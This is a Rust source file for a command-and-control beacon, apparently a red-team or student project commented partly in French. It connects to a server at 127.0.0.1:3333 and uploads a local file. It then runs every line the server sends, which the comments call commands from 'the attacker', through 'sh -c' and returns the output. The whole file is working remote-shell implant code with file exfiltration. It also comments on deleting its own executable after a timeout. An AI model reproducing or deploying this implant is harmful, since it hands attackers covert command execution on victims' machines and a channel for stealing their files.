//! # Module Main.rs du beacon
//! Ce module regroupe les fonctions et le point d'entrée main du programme représentant le beacon

use std::process::Command;
use std::io::BufReader;
use std::io::BufRead;
use std::fs::OpenOptions;
use std::io::BufWriter;
use std::io::Write;
use std::net::SocketAddr;
use std::{thread, time};
use std::net::{Shutdown, TcpStream};
use std::time::{Duration, Instant};
use std::fs::File;
use std::io::prelude::*;
use std::env;
use chrono::prelude::*;

///used to set the timeout to stop the beacon 
const TIMEOUT:u64=60;
//use std::os::unix::net::SocketAddr;


/// Structure contains information of the results command
struct Resultat{
    status: String,
    stdout: String,
    stderr: String,
}





/// Create a new Resultat
fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
    Resultat {
        status,
        stdout,
        stderr,
    }
}


/// after X times the beacon will be destroyed by being shutdown
fn duration_before_shutdown(stream: &mut TcpStream, time:u64) {
    stream.set_read_timeout(Some(Duration::new(TIMEOUT, 0))).expect("set_read_timeout call failed");
}

/// execute commands and returns results
fn execute_commands(command: &str) -> Resultat {
    
    //  runs the program and returns the output
    let output = Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .output()
                    .expect("failed to execute process");
    let s = output.status.to_string();
    let o = String::from_utf8_lossy(&output.stdout).to_string();
    let e = String::from_utf8_lossy(&output.stderr).to_string();   
    let results = create_resultat(s, o, e);
    results
}

/// upload the last interaction date. Hence we can say how much time has passed since the last interaction => when to erase all the files
fn upload_date(stream: &str){
    println!("upload de la date");
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("src/date.txt")
        .unwrap();
    writeln!(file,"{}",stream).expect("Unable to write file");
}


/// display the array result 
fn display_resultat(v: Vec<Resultat>){
    if v.is_empty(){
        println!("Il n'y a pas de resultat ");
    }else{
        for i in &v {
            println!("status: {}", i.status);
            println!("stdout: {}", i.stdout);
            println!("stderr: {}", i.stderr);
        }
    }
}

/// Retrieve the chain command sent by the attacker
fn get_command(command: &str) -> String{
    let mut result = command.replace("command  ", ""); // remove command from the string
    let result = result.replace(" target", ""); // remove target from the string
    result
}

/// Sleep the beacon for a specified amount of time
fn sleep_beacon(milli_second: u64){
    let ten_millis = time::Duration::from_millis(milli_second);
    let now = time::Instant::now();
    thread::sleep(ten_millis);
}

/// function that uploads a file to the server
fn upload_file(stream: &mut TcpStream, path: &str) {
    let mut file = File::open(path).unwrap();
    
    let mut buf = [0; 4096];
    loop {
        let n = file.read(&mut buf).unwrap();
        
        if n == 0 {
            // reached end of file
            break;
        }
        
        stream.write_all(&buf[..n]).expect("Error writing in stream");
    }
    println!("File sent to server !");
}


fn main(){

    let addr = "127.0.0.1:3333";
    let mut stream = TcpStream::connect(addr);
    match stream {
        Ok(stream) => unsafe {
                    println!("Server connecting on addr {}",addr);
            /// get time when executing the function main and check if {{limitTime}} has passed since last communications
            


            duration_before_shutdown(&mut stream.try_clone().unwrap(), 60);
            upload_file(&mut stream.try_clone().unwrap(), "src/uploadFile.txt");

            let mut reader = BufReader::new(&stream);
            let mut writer = &stream;
            let mut line = String::new();

            /// finds the path to the exe we are running => 
            ///will be used to delete it (remove current exe) and print("failed to ....") error if not found
            let exe_path = env::current_exe().expect("failed to ....");
            println!("{}", exe_path.display());
            let utc: DateTime<Utc> = Utc::now(); 
            upload_date(&format!("{}",utc));


            let lines_server = reader.lines().fuse();
            for l in lines_server {
                line = l.unwrap();
                if line.contains("command") | line.contains("target"){

                }
                if line.contains("sleep"){
                    println!("exectue sleep function");
                    sleep_beacon(10000);
                }else{ 
                    /*line.contains("command") | line.contains("target") {*/
                    let mut response = String::from("response:");
                    let command = get_command(line.trim()); // return the command input without "command" and "target"
                    println!("command receive is : {}", command);
                    let results = execute_commands(&command);
                    println!("result of the command : {}", results.stdout);
                    response.push_str(&results.status);
                    response.push_str(" stdout : ");
                    response.push_str(&results.stdout);
                    response.push_str(" stderr : ");
                    response.push_str(&results.stderr);
                    println!("{}", response);
                    writer.write_all(response.as_bytes()).unwrap();
                    //list_result_command.push(results);
                }
            }
        } Err(e) => {
            println!("Error:  {}",e);
        }
    } 
    
    

}

